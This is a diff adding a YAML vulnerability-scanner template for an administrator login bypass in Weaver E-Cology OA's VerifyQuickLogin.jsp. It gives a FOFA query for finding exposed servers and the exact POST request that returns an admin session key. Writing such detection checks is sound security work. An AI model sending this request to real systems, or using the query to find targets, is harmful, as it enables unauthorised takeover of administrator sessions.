@@ -1,0 +1,21 @@
+id: ecology-verifyquicklogin-login-bypass
+
+info:
+  name: 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session
+    fofa: app="泛微-协同办公OA"
+  tags: weaver,ecology,bypass
+  created: 2023/06/23
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobile/plugin/VerifyQuickLogin.jsp
+      body: identifier=1&language=1&ipaddress=x.x.x.x
+    expression: response.status == 200 && response.body.bcontains(b'"sessionkey":') && response.body.bcontains(b'"message":')
+expression: r0()
